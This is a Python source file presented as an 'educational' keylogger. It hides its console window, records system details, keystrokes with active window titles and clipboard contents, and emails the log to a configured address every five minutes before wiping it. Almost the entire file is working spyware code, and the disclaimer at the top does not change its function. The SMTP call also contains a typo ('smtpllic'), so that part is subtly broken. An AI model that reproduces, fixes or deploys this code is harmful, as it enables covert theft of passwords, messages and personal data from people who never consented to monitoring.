"""
Educational Python Keylogger
Created by BackdoorAli (GitHub: https://github.com/BackdoorAli)
For educational purposes only. Unauthorised use is strictly prohibited.
"""

import os
import platform
import socket
import uuid
import getpass
import time
import threading
from datetime import datetime
from pynput import keyboard
import pyperclip
import smtplib
import ssl
from email.message import EmailMessage

try:
    if platform.system() == "Windows":
        import win32gui
    elif platform.system() == "Darwin":
        from AppKit import NSWorkspace
    elif platform.system() == "Linux":
        import subprocess
except ImportError:
    pass

LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "keystrokes.txt")
CLIPBOARD_CHECK_INTERVAL = 10
EMAIL_INTERVAL = 300

EMAIL_SENDER = "youremail@gmail.com"
EMAIL_PASSWORD = "your-app-password"
EMAIL_RECEIVER = "receiveremail@example.com"

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def hide_console():
    if platform.system() == "Windows":
        try:
            import ctypes
            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 0)
                ctypes.windll.kernel32.CloseHandle(whnd)
        except Exception:
            pass

def dump_system_info():
    info = {
        "Timestamp": str(datetime.now()),
        "OS": platform.system() + " " + platform.release(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1]),
        "Username": getpass.getuser(),
    }
    with open(LOG_FILE, "a") as f:
        f.write("=== SYSTEM INFO ===\n")
        for k, v in info.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")

def get_active_window_title():
    try:
        if platform.system() == "Windows":
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        elif platform.system() == "Darwin":
            return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
        elif platform.system() == "Linux":
            return subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"]).decode("utf-8").strip()
    except:
        return "Unknown Window"

last_window = ""

def on_press(key):
    global last_window
    window = get_active_window_title()
    if window != last_window:
        with open(LOG_FILE, "a") as f:
            f.write(f"\n[{datetime.now()}] - Active Window: {window}\n")
        last_window = window

    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()} - Key pressed: {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()} - Special key: {key}\n")

def log_clipboard():
    prev_data = ""
    while True:
        try:
            data = pyperclip.paste()
            if data != prev_data:
                with open(LOG_FILE, "a") as f:
                    f.write(f"{datetime.now()} - Clipboard: {data}\n")
                prev_data = data
        except:
            pass
        time.sleep(CLIPBOARD_CHECK_INTERVAL)

def send_logs():
    while True:
        try:
            with open(LOG_FILE, "r") as f:
                content = f.read()

            msg = EmailMessage()
            msg.set_content(content)
            msg["Subject"] = "Keylogger Report"
            msg["From"] = EMAIL_SENDER
            msg["To"] = EMAIL_RECEIVER

            context = ssl.create_default_context()
            with smtpllic.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                server.login(EMAIL_SENDER, EMAIL_PASSWORD)
                server.send_message(msg)

            open(LOG_FILE, "w").close()
        except Exception as e:
            print("Email failed:", e)

        time.sleep(EMAIL_INTERVAL)

if __name__ == "__main__":
    hide_console()
    dump_system_info()

    threading.Thread(target=log_clipboard, daemon=True).start()
    threading.Thread(target=send_logs, daemon=True).start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
